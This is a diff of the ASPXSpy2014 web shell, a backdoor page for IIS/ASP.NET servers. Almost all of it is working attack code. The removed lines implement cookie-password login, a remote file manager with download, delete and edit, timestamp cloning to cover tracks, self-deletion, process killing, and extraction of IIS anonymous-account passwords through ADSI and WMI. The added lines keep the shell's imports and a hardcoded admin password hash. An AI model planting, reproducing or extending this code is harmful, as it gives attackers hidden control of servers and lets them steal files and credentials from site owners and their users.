@@ -1,2964 +1,5157 @@
-<%@ Page Language="C#" Debug="false" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
+<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
+
 <%@ import Namespace="System.IO"%>
-<%@ import Namespace="System.IO.Compression"%>
+
 <%@ import Namespace="System.Diagnostics"%>
+
 <%@ import Namespace="System.Data"%>
-<%@ import Namespace="System.Data.OleDb"%>
-<%@ import Namespace="System.Data.Common"%>
-<%@ Import Namespace="System.Data.SqlClient"%>
+
 <%@ import Namespace="System.Management"%>
+
+<%@ import Namespace="System.Data.OleDb"%>
+
 <%@ import Namespace="Microsoft.Win32"%>
-<%@ import Namespace="System.Net" %>
+
 <%@ import Namespace="System.Net.Sockets" %>
-<%@ import Namespace="System.Reflection"%>
+
+<%@ import Namespace="System.Net" %>
+
 <%@ import Namespace="System.Runtime.InteropServices"%>
+
 <%@ import Namespace="System.DirectoryServices"%>
+
 <%@ import Namespace="System.ServiceProcess"%>
+
 <%@ import Namespace="System.Text.RegularExpressions"%>
-<%@ Import Namespace="System.Security"%>
-<%@ Import Namespace="System.Security.Permissions"%>
+
 <%@ Import Namespace="System.Threading"%>
+
+<%@ Import Namespace="System.Data.SqlClient"%>
+
+<%@ import Namespace="Microsoft.VisualBasic"%>
+
 <%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+
 <%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+
 <%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+
+<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
 <script runat="server">
-	/*
-	Thanks Snailsor,FuYu,BloodSword,Cnqing,
-	Code by Bin
-	Make in China
-	Blog: http://www.rootkit.net.cn
-	E-mail : master@rootkit.net.cn
 
-	Mod by zcgonvh,last modified on 2014-01-23
-	Bug or idea: zcgonvh@rootkit.net.cn
-	*/
-	public const string Version="ASPXSpy2014";
-	public const string Password="a32c3d3cec20f5a09595b857e45b477f";	//admin
-	private const string DomainUserName="administrator";//change it if domain user name not equals "administrator"
-	private const string PMCacheName=Version+"PMList";
-	private int CssC=1;
-	private DbConnection conn=null;
-	private DbCommand comm=null;
-	protected void Page_Load(object sender,EventArgs e)
-	{
-		JscriptSender(this);
-		if (!Bin_CheckLogin()){return;}
-		if(IsPostBack)
-		{
-			zcg_GetDriver();
-			zcg_SetHeaderInfo();
-      string Bin_Target=Request["__EVENTTARGET"];
-			string Bin_Path=Request["__File"];
-			if(Bin_Target!="")
-			{try{
-				switch(Bin_Target)
-				{
-					case "Bin_Listdir":
-						Bin_File(Bin_FromBase64(Bin_Path));
-						break;
-					case "Bin_Deldir":
-						Bin_Deldir(Bin_FromBase64(Bin_Path));
-						break;
-					case "Bin_Createfile":
-						Bin_CreateFile(Bin_Path);
-						break;
-					case "Bin_Editfile":
-						Bin_CreateFile(Bin_Path);
-						break;
-					case "Bin_Createdir":
-						Bin_CreateDir(Bin_Path);
-						break;
-					case "Bin_CloneTime":
-						Bin_CloneTime(Bin_Path);
-						break;
-					case "Bin_DownFile":
-						Bin_DownFile(Bin_FromBase64(Bin_Path));
-						break;
-					case "Bin_DelFile":
-						Bin_DelFile(Bin_Path);
-						break;
-					case "Bin_Regread":
-						Bin_ShowReg(Bin_FromBase64(Bin_Path));
-						break;
-					case "Bin_KillMe":
-						Bin_KillMe();
-						break;
-					case "zcg_KillProcess":
-						zcg_KillProcess(Bin_Path);
-						break;
-					case "zcg_ListADS":
-						zcg_txbADSPath.Value=Bin_FromBase64(Bin_Path);
-						zcg_EnumADSChildrenAndListProperties(Bin_FromBase64(Bin_Path),zcg_txbADSUser.Value,zcg_txbADSPass.Value,zcg_txbADSType.Value);
-						break;
-					case "zcg_ClosePM":
-						zcg_ClosePM(Bin_FromBase64(Bin_Path));
-						break;
-				}
-				if(Bin_Target.StartsWith("zcg_Rename"))
-				{
-					zcg_Rename(Bin_FromBase64(Bin_Target.Replace("zcg_Rename","")),Bin_Path);
-				}
-				else if(Bin_Target.StartsWith("Bin_CFile"))
-				{
-					Bin_CopyFile(Bin_FromBase64(Bin_Target.Replace("Bin_CFile","")),Bin_Path);
-				}
-			}catch(Exception ex){zcg_ShowError(ex);}}
-		}
-		else
-		{Bin_Main();}
-	}
-	void IHttpHandler.ProcessRequest(HttpContext context)
-	{
-		try{base.ProcessRequest(context);}
-		catch(SecurityException ex){context.Response.Clear();context.Response.Write("AspxSpy request low-trust minimum,Exception message: "+ex.Message);}
-		catch(Exception ex){context.Response.Write(String.Format("Unhandled exception: {0} <pre><xmp>\r\nmessage:\r\n {1} \r\ntrace:\r\n {2} \r\n string:\r\n {3}</xmp></pre>",ex.GetType(),ex.Message,ex.StackTrace,ex));}
-	}
-    private void Hide_Div()
-    {
-        Bin_Div_Process.Visible = false;
-        Bin_Div_File.Visible = false;
-        Bin_Div_Cmd.Visible = false;
-        Bin_Div_Reg.Visible = false;
-        Bin_Div_PortScan.Visible = false;
-        Bin_Div_Data.Visible = false;
-        Bin_Div_PortMap.Visible = false;
-        Bin_Div_Edit.Visible = false;
-        Bin_Div_Search.Visible = false;
-        Bin_Div_WmiTools.Visible = false;
-		zcg_div_ADSViewer.Visible=false;
-		zcg_div_Plugin.Visible=false;
-    }
-	private bool Bin_CheckLogin()
-	{
-		if(Request.Cookies[Version]==null)
-		{
-			Bin_Login();
-			return false;
-		}
-		else
-		{
-			if (Request.Cookies[Version].Value!=Password)
-			{
-				Bin_Login();
-				return false;
-			}
-			else
-			{
-				return true;
-			}
-		}
-	}
-	private void Bin_Login()
-	{
-		Bin_Div_Login.Visible=true;
-		Bin_Div_Content.Visible=false;
-	}
-	protected void Bin_Button_Logout_Click(object sender,EventArgs e)
-	{
-		Session.Abandon();
-		Response.Cookies.Add(new HttpCookie(Version,null));
-		Bin_Login();
-	}
-	private void Bin_Main()
-	{
-		zcg_SetHeaderInfo();
-		zcg_GetDriver();
-		if (Bin_TextBox_Path.Value=="")
-		{
-			Bin_TextBox_Path.Value=Bin_PathBuild(Server.MapPath("."));
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	private void zcg_SetHeaderInfo()
-	{
-		Bin_Div_Content.Visible=true;
-		Bin_Div_Login.Visible=false;
-		Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
-		Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
-		Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('Bin_KillMe','');};";
-		Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")"+zcg_CheckPermission();
-		Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
-	}
-	private string zcg_CheckPermission()
-	{
-		string s="&nbsp;&nbsp;Host Trust Level:&nbsp;&nbsp;<span style='color:red;'>{0}</span>&nbsp;&nbsp;IsFull-Trust:&nbsp;&nbsp;<span style='color:red;'>{1}</span>&nbsp;&nbsp;User:&nbsp&nbsp;<span style='color:red;'>{2}</span>";
-		string u=zcg_GetUserName();
-		try{(new PermissionSet(PermissionState.Unrestricted)).Demand();return string.Format(s,GetTrustLevel(),true,u);}
-		catch{return string.Format(s,GetTrustLevel(),false,u);}
-	}
-	private string zcg_GetUserName()
-	{
-		try{return System.Security.Principal.WindowsIdentity.GetCurrent().Name;}catch{return "Unknown -- No permission";}
-	}
-	private string GetTrustLevel()
-	{
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand();return "Full";}catch{}
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand();return "High";}catch{}
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand();return "Medium";}catch{}
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand();return "Low";}catch{}
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand();return "Minimal";}catch{}
-		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand();return "None";}catch{}
-		return "Unknown";
-	}
-	private void zcg_GetDriver()
-	{
-		string[] drivers=null;
-		try{drivers=Directory.GetLogicalDrives();}
-		catch{string drs="";
-			for(int i=0x41;i<0x5b;i++)
-			{
-				string ds=new string((new char[]{(char)i,':','\\'}));
-				try
-				{
-					DriveInfo di=new DriveInfo(ds);
-					if(di.DriveType!=DriveType.NoRootDirectory){drs+=ds+"|";}
-				}catch{}
-				finally{drivers=drs.Split(new char[]{'|'},(StringSplitOptions)1);}
-			}}
-		Bin_Span_Drv.InnerHtml="";
-		for(int i=0;i<drivers.Length;i++)
-		{
-			Bin_Span_Drv.InnerHtml+=String.Format("<a href=\"javascript:Bin_PostBack('Bin_Listdir','{0}')\">{1}</a> | ",Bin_ToBase64(drivers[i]),Bin_Drvbuild(drivers[i]));
-		}
-	}
-	private string Bin_PathBuild(string path)
-	{
-		if(!path.EndsWith(@"\")){path+=@"\";}return path;
-	}
-	private string Bin_Drvbuild(string instr)
-	{
-		DriveInfo di=new DriveInfo(instr);
-		return String.Format("{0}({1}:)",di.DriveType,instr[0]);
-	}
-	private string Bin_ToBase64(string instr)
-	{
-		byte[] tmp=Encoding.UTF8.GetBytes(instr);
-		return Convert.ToBase64String(tmp);
-	}
-	private string Bin_FromBase64(string instr)
-	{
-		byte[] tmp=Convert.FromBase64String(instr);
-		return Encoding.UTF8.GetString(tmp);
-	}
-	private TableRow zcg_GetTableRow()
-	{
-		TableRow tr=new TableRow();
-		zcg_SetControlAttribute(tr);
-		return tr;
-	}
-	private void zcg_SetControlAttribute(WebControl ctl)
-	{
-		string bg=Bin_Css();
-		ctl.Attributes["onmouseover"]="this.className='focus';";
-		ctl.CssClass=bg;
-		ctl.Attributes["onmouseout"]="this.className='"+bg+"';";
-	}
-	private void Bin_File(string path)
-	{
-		try{
-		Hide_Div();
-		Bin_Div_File.Visible=true;
-		Bin_H2_Title.InnerText="File Manager >>";
-		Bin_TextBox_Path.Value=Bin_PathBuild(path);
-		path=(path.EndsWith("\\")&&(!path.EndsWith(":\\")))?path.TrimEnd('\\'):path;
-		DirectoryInfo Bin_dir=new DirectoryInfo(path);
-		try{
-		if(Directory.GetParent(path)!=null)
-		{
-			TableRow p=zcg_GetTableRow();
-			for(int i=1;i<6;i++)
-			{
-				TableCell pc=new TableCell();
-				if(i==1)
-				{
-					pc.Width=Unit.Parse("2%");
-					pc.Text="0";
-				}
-				if(i==2)
-				{
-					pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+Bin_ToBase64(Directory.GetParent(path).ToString())+"')\">Parent Directory</a>";
-				}
-				p.Cells.Add(pc);
-				Bin_Table_File.Rows.Add(p);
-			}
-		}}catch{}
-		try
-		{
-			int dir_c=0;
-			foreach(DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
-			{
-				dir_c++;
-				TableCell tc=new TableCell();
-				tc.Width=Unit.Parse("2%");
-				tc.Text="0";
-				TableRow tr=zcg_GetTableRow();
-				tr.Cells.Add(tc);
-				TableCell dirname=new TableCell();
-				dirname.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
-				tr.Cells.Add(dirname);
-				TableCell dirtime=new TableCell();
-				dirtime.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
-				tr.Cells.Add(dirtime);
-				Bin_Table_File.Rows.Add(tr);
-				TableCell dirsize=new TableCell();
-				dirsize.Text="--";
-				tr.Cells.Add(dirsize);
-				Bin_Table_File.Rows.Add(tr);
-				TableCell diraction=new TableCell();
-				diraction.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('Bin_Deldir','"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('zcg_Rename"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
-				tr.Cells.Add(diraction);
-				Bin_Table_File.Rows.Add(tr);
-			}
-			TableRow intr=new TableRow();
-			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
-			intr.Attributes["bgcolor"]="#dddddd";
-			TableCell intc=new TableCell();
-			intc.Attributes["colspan"]="6" ;
-			intc.Attributes["height"]="5";
-			intr.Cells.Add(intc);
-			Bin_Table_File.Rows.Add(intr);
-			int file_c=0;
-			foreach(FileInfo Bin_Files in Bin_dir.GetFiles())
-			{
-				file_c++;
-				TableRow tr=zcg_GetTableRow();
-				TableCell tc=new TableCell();
-				tc.Width=Unit.Parse("2%");
-				tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+Bin_ToBase64(Bin_Files.Name)+"\">";
-				tr.Cells.Add(tc);
-				TableCell filename=new TableCell();
-				if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
-				{
-					string url=Request.Url.ToString();
-					filename.Text="<a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+Bin_Files.Name+"</a>";
-				}
-				else
-				{
-					filename.Text=Bin_Files.Name;
-				}
-				TableCell filetime=new TableCell();
-				filetime.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
-				TableCell filesize=new TableCell();
-				filesize.Text=Bin_FileSize(Bin_Files.Length);
-				TableCell action=new TableCell();
-				action.Text="<a href=\"#\" onclick=\"Bin_PostBack('Bin_DownFile','"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_Files.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+Bin_TextBox_Path.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_Files.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('zcg_Rename"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_Files.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_CloneTime','"+Bin_Files.Name+"')\">Time</a> ";
-				tr.Cells.Add(filename);
-				tr.Cells.Add(filetime);
-				tr.Cells.Add(filesize);
-				tr.Cells.Add(action);
-				Bin_Table_File.Rows.Add(tr);
-			}
-			TableRow cktr=zcg_GetTableRow();
-			for(int i=1;i<4;i++)
-			{
-				TableCell cktd=new TableCell();
-				if(i==1)
-				{
-					cktd.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
-				}
-				if(i==2)
-				{
-					cktd.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('Bin_DelFile',d_file)};}\">Delete selected</a>";
-				}
-				if(i==3)
-				{
-					cktd.ColumnSpan=4;
-					cktd.Style.Add("text-align","right");
-					cktd.Text=dir_c+" directories/ "+file_c+" files";
-				}
-				cktr.Cells.Add(cktd);
-			}
-			Bin_Table_File.Rows.Add(cktr);
-		}
-		catch(Exception err)
-		{
-			zcg_ShowError(err);
-		}}catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private string Bin_Css()
-	{
-		CssC++;
-		if(CssC % 2==0)
-		{
-			return "alt1";
-		}
-		else
-		{
-			return "alt2";
-		}
-	}
-	private void Bin_Deldir(string dirstr)
-	{
-		try
-		{
-			Directory.Delete(dirstr,true);
-			Bin_Msg("Directory delete success !");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Directory.GetParent(dirstr).ToString());
-	}
-	private void zcg_Rename(string source,string dire)
-	{
-		try
-		{
-			dire=Path.Combine(Bin_TextBox_Path.Value,dire);
-			Directory.Move(source,dire);
-			Bin_Msg("Rename Success !");
-		}
-		catch(Exception error)
-		{
-			Bin_Msg(error.Message);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	private void Bin_CopyFile(string spath,string dpath)
-	{
-		try
-		{
-			File.Copy(spath,dpath);
-			Bin_Msg("File Copy Success !");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	private void Bin_CreateDir(string path)
-	{
-		try
-		{
-			Directory.CreateDirectory(Bin_TextBox_Path.Value+path);
-			Bin_Msg("Directory created success !");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	private void Bin_CreateFile(string path)
-	{
-		if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
-		{
-			foreach(ListItem item in Bin_List_Code.Items)
-			{
-				if(item.Selected)
-				{
-					item.Selected=false;
-				}
-			}
-		}
-		Bin_H2_Title.InnerText="Create/ Edit File >>";
-		Hide_Div();
-		Bin_Div_Edit.Visible=true;
-		if(path.IndexOf(":")< 0)
-		{
-			Bin_TextBox_Fp.Value=Bin_TextBox_Path.Value+path;
-		}
-		else
-		{
-			Bin_TextBox_Fp.Value=path;
-		}
-		if(File.Exists(Bin_TextBox_Fp.Value))
-		{
-			StreamReader sr;
-			if(Bin_List_Code.SelectedItem.Text=="UTF-8")
-			{
-				sr=new StreamReader(Bin_TextBox_Fp.Value,Encoding.UTF8);
-			}
-			else
-			{
-				sr=new StreamReader(Bin_TextBox_Fp.Value,Encoding.Default);
-			}
-			Bin_Textarea_Edit.InnerText=sr.ReadToEnd();
-			sr.Close();
-		}
-		else
-		{
-			Bin_Textarea_Edit.InnerText="";
-		}
-	}
-	private void Bin_DownFile(string path)
-	{
-		FileStream fs=null;
-		byte[] buffer=new byte[0x1000];
-		int count=0;
-		try{
-		FileInfo fi=new FileInfo(path);
-		fs=fi.OpenRead();
-		Response.Clear();
-		Response.ClearHeaders();
-		Response.Buffer=false;
-		this.EnableViewState=false;
-		Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));
-		Response.AddHeader("Content-Length",fi.Length.ToString());
-		Response.ContentType="application/octet-stream";
-		count=fs.Read(buffer,0,0x1000);
-		while(count>0)
-		{
-			Response.OutputStream.Write(buffer,0,count);
-			Response.Flush();
-			count=fs.Read(buffer,0,0x1000);
-		}
-		Page.Response.Flush();
-		Response.End();
-		}catch(Exception ex){zcg_ShowError(ex);}
-		finally{if(fs!=null){fs.Close();}}
-	}
-	private void Bin_DelFile(string path)
-	{
-		try
-		{
-			string[] mydata=path.Split(',');
-			for(int i=0;i<mydata.Length-1;i++)
-			{
-				File.Delete(Bin_TextBox_Path.Value+Bin_FromBase64(mydata[i]));
-			}
-			Bin_Msg("File Delete Success !");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-		Bin_File(Bin_TextBox_Path.Value);
-	}
-	private void Bin_KillMe()
-	{
-		try
-		{
-			File.Delete(Request.PhysicalPath);
-			Response.Redirect("http://www.rootkit.net.cn");
-		}
-		catch(Exception error)
-		{
-			zcg_ShowError(error);
-		}
-	}
-	private void Bin_CloneTime(string path)
-	{
+public string Password="a32c3d3cec20f5a09595b857e45b477f";//admin
 
-		try{
-		path=Path.Combine(Bin_TextBox_Path.Value,path);
-		Bin_TextBox_Sp.Value=path;
-		Bin_TextBox_Dp.Value=Bin_TextBox_Path.Value;
-		Bin_TextBox_Sp1.Value=path;
-		string Att=File.GetAttributes(Bin_TextBox_Sp.Value).ToString();
-		Bin_H2_Title.InnerText="Clone file was last modified time >>";
-		Hide_Div();
-		Bin_Div_Time.Visible=true;
-		if(Att.LastIndexOf("ReadOnly")!=-1)
-		{
-			Bin_CheckBox_ReadOnly.Checked=true;
-		}
-		if(Att.LastIndexOf("System")!=-1)
-		{
-			Bin_CheckBox_System.Checked=true;
-		}
-		if(Att.LastIndexOf("Hidden")!=-1)
-		{
-			Bin_CheckBox_Hiddent.Checked=true;
-		}
-		if(Att.LastIndexOf("Archive")!=-1)
-		{
-			Bin_CheckBox_Archive.Checked=true;
-		}
-		Bin_TextBox_Creation.Value=File.GetCreationTimeUtc(Bin_TextBox_Sp1.Value).ToString();
-		Bin_TextBox_LastWrite.Value=File.GetLastWriteTimeUtc(Bin_TextBox_Sp1.Value).ToString();
-		Bin_TextBox_LastAccess.Value=File.GetLastAccessTimeUtc(Bin_TextBox_Sp1.Value).ToString();
-		}catch(Exception ex){zcg_ShowError(ex);}
-	}
-	private String Bin_FileSize(Int64 fileSize)
-	{
-		if(fileSize<0)
-		{
-			throw new ArgumentOutOfRangeException("fileSize");
-		}
-		else if(fileSize >= 1024 * 1024 * 1024)
-		{
-			return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
-		}
-		else if(fileSize >= 1024 * 1024)
-		{
-			return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
-		}
-		else if(fileSize >= 1024)
-		{
-			return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
-		}
-		else
-		{
-			return string.Format("{0} B",fileSize);
-		}
-	}
-	private void Bin_IISSpy()
-	{
-		string iisstr="IIS://localhost/W3SVC";
-		DirectoryEntry mydir=new DirectoryEntry(iisstr);
-		foreach(DirectoryEntry child in mydir.Children)
-		{
-			int tmpi=0;
-			if(Int32.TryParse(child.Name.ToString(),out tmpi))
-			{
-				DirectoryEntry newdir=new DirectoryEntry(iisstr+"/"+child.Name.ToString());
-				DirectoryEntry dirmsg=newdir.Children.Find("root","IIsWebVirtualDir");
-				TableRow TR=zcg_GetTableRow();
-				TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
-				for(int i=1;i<6;i++)
-				{
-					try
-					{
-						TableCell TC_USER=new TableCell();
-						switch(i)
-						{	case 1:
-								TC_USER.Text=tmpi.ToString();
-								break;
-							case 2:
-								TC_USER.Text=dirmsg.Properties["AnonymousUserName"].Value.ToString();
-								break;
-							case 3:
-								TC_USER.Text=dirmsg.Properties["AnonymousUserPass"].Value.ToString();
-								break;
-							case 4:
-								StringBuilder sb=new StringBuilder();
-								PropertyValueCollection pc=child.Properties["ServerBindings"];
-								for (int j=0; j < pc.Count; j++)
-								{
-									sb.Append(pc[j].ToString()+"<br>");
-								}
-								TC_USER.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
-								break;
-							case 5:
-								TC_USER.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+Bin_ToBase64(dirmsg.Properties["Path"].Value.ToString())+"')\">"+dirmsg.Properties["Path"].Value.ToString()+"</a>";
-								break;
-						}
-						TR.Cells.Add(TC_USER);
-					}
-					catch{continue;}
-				}
-				Bin_Table_IISSpy.Controls.Add(TR);
-			}
-		}
-	}
-	private void Bin_WMI_IISSpy()
-	{
-		Regex re=new Regex(@"W3SVC\/(\d+)\/",RegexOptions.IgnoreCase);
-		ManagementScope wmiscope=new ManagementScope(@"\\.\root\MicrosoftIISv2");
-		wmiscope.Connect();
-		ObjectQuery wmiquery=new ObjectQuery("SELECT * FROM IISWebVirtualDirSetting");
-		ManagementObjectSearcher wmisearcher=new ManagementObjectSearcher(wmiscope,wmiquery);
-		ManagementObjectCollection querycoll=wmisearcher.Get();
-		foreach(ManagementObject objmanage in querycoll)
-		{
-			string siteid=re.Matches(objmanage["Name"].ToString())[0].Groups[1].Value;
-			TableRow TR=zcg_GetTableRow();
-			for(int i=1;i<6;i++)
-			{
-				try
-				{
-					TableCell TC_USER=new TableCell();
-					switch (i)
-					{
-						case 1:
-							TC_USER.Text=siteid;
-							break;
-						case 2:
-							TC_USER.Text=objmanage["AnonymousUserName"].ToString();
-							break;
-						case 3:
-							TC_USER.Text=objmanage["AnonymousUserPass"].ToString();
-							break;
-						case 4:
-							wmiquery=new ObjectQuery("SELECT * from IISWebServerSetting where Name='W3SVC/"+siteid+"'");
-							wmisearcher=new ManagementObjectSearcher(wmiscope,wmiquery);
-							ManagementObjectCollection svrcoll=wmisearcher.Get();
-							foreach(ManagementObject objsvr in svrcoll)
-							{
-								StringBuilder sb=new StringBuilder();
-								TR.Attributes["title"]="Site:"+objsvr["ServerComment"];
-								foreach(ManagementBaseObject objbind in (ManagementBaseObject[])objsvr["ServerBindings"])
-								{
-									sb.Append(objbind["IP"].ToString()+":"+objbind["Port"].ToString()+":"+objbind["Hostname"].ToString()+"<br>");
-								}
-								TC_USER.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
-							}
-							break;
-						case 5:
-							TC_USER.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+Bin_ToBase64(objmanage["Path"].ToString())+"')\">"+objmanage["Path"].ToString()+"</a>";
-							break;
-					}
-					TR.Cells.Add(TC_USER);
-				}
-				catch{continue;}
-			}
-			Bin_Table_IISSpy.Controls.Add(TR);
-		}
-	}
-	private ManagementObjectCollection Bin_WmiQuery(string @namespace,string query)
-	{
-		ManagementObjectSearcher QS=new ManagementObjectSearcher(@namespace,query);
-		return QS.Get();
-	}
-	private DataTable zcg_WmiDataTable(string @namespace,string query)
-	{
-		ManagementObjectSearcher QS=new ManagementObjectSearcher(@namespace,query);
-		return zcg_WmiSearcherToDataTable(QS);
-	}
-	private DataTable zcg_WmiDataTable(string computer,string username,string password,string @namespace,string query)
-	{
-		ConnectionOptions connection = new ConnectionOptions();
-		string domain=(username.IndexOf("\\")>0)?(username.Split('\\')[0]):"";
-        connection.Username = (username.IndexOf("\\")>0)?(username.Split('\\')[1]):username;
-        connection.Password = password;
-        connection.Authority = "ntlmdomain:"+domain;
-        ManagementScope scope = new ManagementScope("\\\\"+computer+"\\"+@namespace, connection);
-        scope.Connect();
-        ObjectQuery objquery= new ObjectQuery(query);
-        ManagementObjectSearcher QS = new ManagementObjectSearcher(scope, objquery);
-		return zcg_WmiSearcherToDataTable(QS);
-	}
-	private DataTable zcg_WmiSearcherToDataTable(ManagementObjectSearcher QS)
-	{
-		DataTable dt=new DataTable();
-		foreach(ManagementObject m in QS.Get())
-		{
-			DataRow dr=dt.NewRow();
-			PropertyDataCollection.PropertyDataEnumerator oEnum;
-			oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
-			while(oEnum.MoveNext())
-			{
-				PropertyData prop=(PropertyData)oEnum.Current;
-				if(dt.Columns.IndexOf(prop.Name)==-1)
-				{
-					dt.Columns.Add(prop.Name);
-					dt.Columns[dt.Columns.Count-1].DefaultValue="";
-				}
-				if(m[prop.Name]!=null)
-				{
-					dr[prop.Name]=m[prop.Name].ToString();
-				}
-				else
-				{
-					dr[prop.Name]="";
-				}
-			}
-			dt.Rows.Add(dr);
-		}
-		return dt;
-	}
-	private void Bin_GetProcess()
-	{
-		int pcount=0;
-		Process[] p=Process.GetProcesses();
-		foreach(Process sp in p)
-		{
-			pcount++;
-			TableRow tr=zcg_GetTableRow();
-			for(int i=1;i<7;i++)
-			{
-				TableCell td=new TableCell();
-				if(i==1)
-				{
-					td.Width=Unit.Parse("2%");
-					td.Text=pcount.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==2)
-				{
-					td.Text=sp.Id.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==3)
-				{
-					td.Text=sp.ProcessName.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==4)
-				{
-					td.Text=sp.Threads.Count.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==5)
-				{
-					td.Text=sp.BasePriority.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==6)
-				{
-					td.Text=zcg_MakeKillProcessLink(sp.Id);
-					tr.Controls.Add(td);
-				}
-			}
-			Bin_Table_Process.Controls.Add(tr);
-		}
-	}
-	private void Bin_Wmi_GetProcess()
-	{
-		int pcount=0;
-		DataTable dt=zcg_WmiDataTable("root\\CIMV2","select * from Win32_Process");
-		for(int j=0;j<dt.Rows.Count;j++)
-		{
-			pcount++;
-			TableRow tr=zcg_GetTableRow();
-			for(int i=1;i<7;i++)
-			{
-				TableCell td=new TableCell();
-				if(i==1)
-				{
-					td.Width=Unit.Parse("2%");
-					td.Text=pcount.ToString();
-					tr.Controls.Add(td);
-				}
-				if(i==2)
-				{
